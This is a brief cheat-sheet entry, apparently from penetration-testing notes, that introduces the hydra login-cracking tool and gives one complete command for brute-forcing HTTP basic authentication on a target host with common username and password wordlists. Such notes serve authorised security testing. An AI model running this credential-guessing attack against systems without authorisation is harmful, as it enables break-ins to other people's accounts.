[hydra](https://github.com/vanhauser-thc/thc-hydra) is a CLI and GUI tool for cracking the authentication of a service.

HTTP basic authentication:

```
hydra -t 16 -s 443 -S \
-m https://{$FQDN}/ ${FQDN} https-get \
-L github/SecLists/Usernames/top-usernames-shortlist.txt \
-P github/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt
```